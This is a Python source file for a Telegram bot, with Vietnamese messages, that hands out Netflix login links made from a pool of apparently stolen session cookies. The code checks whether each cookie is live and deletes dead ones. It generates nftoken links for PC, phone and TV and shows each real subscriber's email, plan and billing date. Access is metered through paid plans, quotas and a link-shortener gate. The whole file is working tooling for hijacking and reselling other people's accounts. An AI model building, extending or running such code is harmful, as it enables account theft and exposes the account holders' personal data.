"""
Handlers for the minimal Netflix bot.

Only /start and /loginlink. Quota + plan live on Supabase (web-managed).
"""

import asyncio
import logging
import random
import secrets
import time
from concurrent.futures import ThreadPoolExecutor
from html import escape
from urllib.parse import quote

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes
from telegram.constants import ParseMode

from config import (
    ADMIN_IDS,
    ADMIN_TAG,
    BOT_USERNAME,
    GROUP_USERNAMES,
    SHRINKME_API_KEY,
    SHRINKME_GATE_TTL,
    WEB_URL,
)
from shrinkme import shorten as shrinkme_shorten
from supabase_client import (
    consume_quota,
    delete_cookie,
    downgrade_expired,
    get_cookie_pool,
    get_profile_by_telegram,
    get_quota_left,
    update_cookie_status,
)

logger = logging.getLogger("NetflixBot")

_executor = ThreadPoolExecutor(max_workers=4)

# ── Shrinkme gate tokens (RAM, TTL, single-use, bind user_id) ──
_shrinkme_pending = {}  # token -> {"user_id": int, "created": float}

# ── Rate limit: 5 lần/15 phút/user ──
_rate = {}  # user_id -> [timestamps]


def _rate_limited(key, user_id, limit=5, window=15 * 60):
    now = time.time()
    ts = [t for t in _rate.get((key, user_id), []) if now - t < window]
    if len(ts) >= limit:
        _rate[(key, user_id)] = ts
        return True
    ts.append(now)
    _rate[(key, user_id)] = ts
    return False


def _create_shrinkme_token(user_id):
    token = secrets.token_hex(8)
    _shrinkme_pending[token] = {"user_id": user_id, "created": time.time()}
    return token


def _pop_shrinkme_token(token, user_id):
    item = _shrinkme_pending.pop(token, None)
    if not item:
        return False
    if item["user_id"] != user_id:
        return False
    if time.time() - item["created"] > SHRINKME_GATE_TTL:
        return False
    return True


def _build_device_links(link):
    """Build 3-device login links from a login URL."""
    if not link:
        return {}
    token = ""
    if "nftoken=" in link:
        token = link.split("nftoken=", 1)[1]
    if not token:
        return {"pc": link, "phone": link, "tv": link}
    return {
        "pc": f"https://netflix.com/?nftoken={token}",
        "phone": f"https://netflix.com/unsupported?nftoken={token}",
        "tv": f"https://netflix.com/tv2?nftoken={token}",
    }


def _find_and_generate_login_link():
    """
    Chọn cookie ngẫu nhiên từ pool (Supabase) → check → gen NFToken → validate.
    Returns (link, error, payload).
    """
    from checker import parse_cookie_line, check_cookie, generate_nftoken, validate_nftoken

    pool = get_cookie_pool()
    if not pool:
        return None, "Không có cookie trong pool. Vui lòng thử lại sau.", None

    max_tries = min(len(pool), 10)
    used = set()
    for _ in range(max_tries):
        idx = random.randrange(len(pool))
        if idx in used:
            continue
        used.add(idx)
        raw = pool[idx]

        netflix_id, secure_id, extras = parse_cookie_line(raw)
        if not netflix_id:
            continue

        info = check_cookie(netflix_id, secure_id)
        status = info.get("status")

        if status == "DEAD":
            delete_cookie(raw)
            continue
        if status == "ERROR":
            time.sleep(1)
            continue
        if str(info.get("membershipStatus", "")).upper() == "FORMER_MEMBER":
            delete_cookie(raw)
            continue

        # Cookie LIVE — build cookie dict + gen nftoken
        cookie_dict = {"NetflixId": netflix_id}
        if secure_id:
            cookie_dict["SecureNetflixId"] = secure_id
        cookie_dict.update(extras)
        cookie_dict.update(info.get("_cookies") or {})

        token, error = generate_nftoken(cookie_dict)
        if not token:
            continue

        login_link = f"https://www.netflix.com/login?nftoken={quote(token, safe='')}"
        payload = {
            "plan": info.get("plan") or "-",
            "email": info.get("email") or "-",
            "billing": info.get("billing") or "-",
        }

        # Validate token (không chặn nếu unknown)
        v = validate_nftoken(token)
        if v is False:
            continue

        # Cập nhật trạng thái cookie lên Supabase
        update_cookie_status(
            raw,
            "green",
            country_code=info.get("country"),
            plan_name=info.get("plan"),
            email=info.get("email"),
        )
        return login_link, None, payload

    return None, "Không tìm thấy cookie LIVE. Vui lòng thử lại sau.", None


def _build_loginlink_message(link, payload, quota_left, quota_limit):
    """Tin nhắn kết quả nhận link."""
    account_plan = (payload or {}).get("plan") or "-"
    email = (payload or {}).get("email") or "-"
    billing = (payload or {}).get("billing") or "-"
    links = _build_device_links(link)
    admin_url = "https://t.me/" + ADMIN_TAG.lstrip("@")

    lines = [
        "🎬 <b>Link đăng nhập Netflix của bạn</b>",
        "",
        f"📦 <b>Gói:</b> {escape(str(account_plan))}",
        f"📧 <b>Mail:</b> {escape(str(email))}",
        f"💳 <b>Hạn:</b> {escape(str(billing))}",
        "",
        "🔗 <b>Link đăng nhập:</b>",
    ]
    if links:
        lines.append(f"💻 PC: <code>{escape(links['pc'])}</code>")
        lines.append(f"📱 Phone: <code>{escape(links['phone'])}</code>")
        lines.append(f"📺 TV: <code>{escape(links['tv'])}</code>")
    else:
        lines.append(f"<code>{escape(link)}</code>")
    lines.append("")
    lines.append("⏳ Link có hiệu lực trong 60 phút.")
    if quota_limit > 0:
        lines.append(f"✅ Còn <b>{quota_left}</b>/{quota_limit} lượt hôm nay.")
    lines.append(f"🛠 Liên hệ: <a href=\"{admin_url}\">Admin</a>")
    return "\n".join(lines)


async def _deliver_login_link(update: Update, context: ContextTypes.DEFAULT_TYPE, profile, lang="vi"):
    """Tạo + gửi link đăng nhập. Trừ quota nếu basic/pro."""
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return False

    searching = await msg.reply_text("🔍 Đang tìm cookie LIVE...", parse_mode=ParseMode.HTML)

    loop = asyncio.get_event_loop()
    link, error, payload = await loop.run_in_executor(_executor, _find_and_generate_login_link)

    if not link:
        await searching.edit_text(
            f"❌ {error or 'Không thể tạo link. Vui lòng thử lại sau.'}",
            parse_mode=ParseMode.HTML,
        )
        return False

    # Trừ quota (chỉ basic/pro)
    quota_left = get_quota_left(profile)
    quota_limit = int(profile.get("quota_limit") or 0)
    if profile.get("plan") not in (None, "free"):
        updated = consume_quota(profile)
        if updated:
            quota_left = get_quota_left(updated)

    await searching.edit_text(
        _build_loginlink_message(link, payload, quota_left, quota_limit),
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
    )
    return True


async def _try_send_shrinkme_gate(send_fn, user, lang="vi") -> bool:
    """
    Gửi gate shrinkme. Admin / key rỗng → False (chạy luồng trực tiếp).
    True = đã gửi gate, caller dừng.
    """
    if user.id in ADMIN_IDS or not SHRINKME_API_KEY:
        return False

    token = _create_shrinkme_token(user.id)
    deep_link = f"https://t.me/{BOT_USERNAME.lstrip('@')}?start=shrinkme_{token}"
    loop = asyncio.get_event_loop()
    short = await loop.run_in_executor(_executor, shrinkme_shorten, deep_link)
    if not short:
        await send_fn(
            "⚠️ Hệ thống gate đang bảo trì. Vui lòng thử lại sau.",
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
        return True

    await send_fn(
        f"🔗 <b>Vượt link để nhận link đăng nhập:</b>\n\n"
        f"👉 <a href=\"{short}\">Bấm vào đây</a>\n\n"
        f"⏳ Link có hiệu lực trong 30 phút.",
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
    )
    return True


async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return

    # Gate shrinkme pending (user quay lại từ link rút gọn)
    text = (msg.text or "").strip()
    if text.startswith("/start shrinkme_"):
        token = text.split("shrinkme_", 1)[1]
        if _pop_shrinkme_token(token, user.id):
            profile = get_profile_by_telegram(user.id)
            if profile:
                await _deliver_login_link(update, context, profile)
            else:
                await msg.reply_text(
                    "❌ Không tìm thấy tài khoản của bạn. Vui lòng đăng ký web và liên kết Telegram ID trước.",
                    parse_mode=ParseMode.HTML,
                )
        else:
            await msg.reply_text(
                "❌ Link gate không hợp lệ hoặc đã hết hạn. Vui lòng dùng /loginlink lại.",
                parse_mode=ParseMode.HTML,
            )
        return

    profile = get_profile_by_telegram(user.id)
    if profile:
        plan = profile.get("plan") or "free"
        quota_left = get_quota_left(profile)
        quota_limit = int(profile.get("quota_limit") or 0)
        plan_label = {"free": "Free", "basic": "Basic", "pro": "Pro"}.get(plan, plan)
        await msg.reply_text(
            f"👋 Chào {escape(user.first_name or 'bạn')}!\n\n"
            f"📊 <b>Gói:</b> {plan_label}\n"
            f"🎟 <b>Lượt còn lại hôm nay:</b> {quota_left if quota_limit > 0 else 'Không giới hạn (qua gate)'}\n\n"
            f"Dùng /loginlink để lấy link đăng nhập Netflix.",
            parse_mode=ParseMode.HTML,
        )
    else:
        await msg.reply_text(
            f"👋 Chào {escape(user.first_name or 'bạn')}!\n\n"
            f"Bot này yêu cầu tài khoản web để quản lý lượt dùng.\n\n"
            f"1️⃣ Đăng ký/đăng nhập tại: {WEB_URL}\n"
            f"2️⃣ Vào trang <b>Hồ sơ</b>, nhập <b>Telegram ID</b> của bạn (lấy từ @userinfobot)\n"
            f"3️⃣ Quay lại đây dùng /loginlink\n\n"
            f"🛠 Liên hệ: <a href=\"https://t.me/{ADMIN_TAG.lstrip('@')}\">Admin</a>",
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )


async def cmd_loginlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return

    # Rate limit: 5 lần/15 phút
    if _rate_limited("loginlink", user.id):
        await msg.reply_text(
            "⏳ Bạn đang thao tác quá nhanh. Vui lòng thử lại sau 15 phút.",
            parse_mode=ParseMode.HTML,
        )
        return

    # Tìm profile theo telegram_id
    profile = get_profile_by_telegram(user.id)
    if not profile:
        await msg.reply_text(
            f"❌ Bạn chưa liên kết tài khoản.\n\n"
            f"1️⃣ Đăng ký/đăng nhập tại: {WEB_URL}\n"
            f"2️⃣ Vào trang <b>Hồ sơ</b>, nhập <b>Telegram ID</b> của bạn\n"
            f"3️⃣ Quay lại đây dùng /loginlink",
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
        return

    # Downgrade nếu plan hết hạn
    profile = downgrade_expired(profile)

    # Kiểm tra quota
    quota_left = get_quota_left(profile)
    quota_limit = int(profile.get("quota_limit") or 0)
    plan = profile.get("plan") or "free"

    if plan not in (None, "free") and quota_left <= 0:
        await msg.reply_text(
            f"❌ Bạn đã dùng hết {quota_limit} lượt hôm nay.\n"
            f"Hạn mức sẽ reset vào 00:00 (giờ VN).\n"
            f"Liên hệ: <a href=\"https://t.me/{ADMIN_TAG.lstrip('@')}\">Admin</a>",
            parse_mode=ParseMode.HTML,
        )
        return

    # Gate shrinkme (free plan bắt buộc qua gate; basic/pro cũng qua gate)
    if await _try_send_shrinkme_gate(msg.reply_text, user):
        return

    await _deliver_login_link(update, context, profile)
